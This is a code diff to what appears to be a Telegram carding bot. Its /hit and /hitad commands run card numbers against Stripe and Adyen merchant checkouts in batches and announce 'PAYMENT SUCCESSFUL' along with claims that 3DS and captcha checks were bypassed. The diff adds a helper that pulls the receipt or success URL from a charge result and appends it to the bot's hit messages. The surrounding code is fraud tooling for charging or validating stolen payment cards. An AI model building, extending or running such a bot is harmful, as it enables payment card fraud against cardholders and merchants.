@@ -191,6 +191,16 @@ def extract_clean_site_domain(merchant: str, url_str: str) -> str:
     except Exception:
         return ""
 
+def extract_success_url_line(res: dict) -> str:
+    """Extracts final/success/receipt/confirmation URL line on successful payment."""
+    if not res.get('success'):
+        return ""
+    success_url = res.get('receipt_url') or res.get('final_url') or res.get('redirect_url') or res.get('success_url') or res.get('3ds_url')
+    if success_url:
+        escaped_url = html.escape(str(success_url))
+        return f"\n🔗 <b>Success URL:</b> {escaped_url}"
+    return ""
+
 def is_session_expired_err(res: dict) -> bool:
     """Check if response indicates a single-use / pay by link session exhaustion."""
     reason = str(res.get('error') or res.get('decline_code') or '').lower()
@@ -362,6 +372,7 @@ async def hit_command(message: types.Message):
                 if res['success']:
                     tds_line = "\n🔓 3DS: <b>BYPASSED [STRIPE]</b> (3DS2 → Succeeded)" if res.get('3ds_bypassed') else ""
                     cpt_line = "\n🤖 Captcha: <b>BYPASSED [STRIPE]</b>" if res.get('captcha_bypassed') else ""
+                    succ_url_line = extract_success_url_line(res)
                     hit_text = (
                         f"✅ <b>PAYMENT SUCCESSFUL [STRIPE]</b>\n"
                         f"💳 <code>{card_str}</code>\n"
@@ -369,7 +380,8 @@ async def hit_command(message: types.Message):
                         f"🛒 Merchant: {merchant_disp}\n"
                         f"⏱ {res['response_time']:.2f}s"
                         f"{tds_line}"
-                        f"{cpt_line}" + note_line
+                        f"{cpt_line}"
+                        f"{succ_url_line}" + note_line
                     )
                 else:
                     code_raw = str(res.get('decline_code') or res.get('error') or 'unknown').lower()
@@ -407,6 +419,9 @@ async def hit_command(message: types.Message):
                     resp_str = res.get('error') or res.get('decline_code') or "Card declined"
 
                 block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(str(resp_str))}"
+                succ_url_line = extract_success_url_line(res)
+                if succ_url_line:
+                    block += succ_url_line
                 if is_session_expired_err(res):
                     block += "\n⚠️ <i>[Session Expired — Batch Halted]</i>"
 
@@ -520,6 +535,9 @@ async def hitad_command(message: types.Message):
                     resp_str = res.get('error') or res.get('decline_code') or "Refused"
 
                 block = f"CC: <code>{card_str}</code>\nStatus: {status_str}\nResponse: {html.escape(resp_str)}"
+                succ_url_line = extract_success_url_line(res)
+                if succ_url_line:
+                    block += succ_url_line
                 
                 expired = is_session_expired_err(res)
                 if expired:
@@ -562,12 +580,14 @@ async def hitad_command(message: types.Message):
             note_line = "" if is_approved else "\n\n<i>Note: this message will be deleted automatically after 30sec</i>"
 
             if res.get('success'):
+                succ_url_line = extract_success_url_line(res)
                 hit_text = (
                     f"✅ <b>PAYMENT SUCCESSFUL [ADYEN]</b>\n"
                     f"💳 <code>{card_str}</code>\n"
                     f"💰 Amount: {amount_val}\n"
                     f"🛒 Merchant: {merchant_disp}\n"
-                    f"⏱ {res.get('response_time', 0):.2f}s" + note_line
+                    f"⏱ {res.get('response_time', 0):.2f}s"
+                    f"{succ_url_line}" + note_line
                 )
             else:
                 reason_msg = html.escape(str(res.get('error') or res.get('decline_code') or 'refused')[:250])
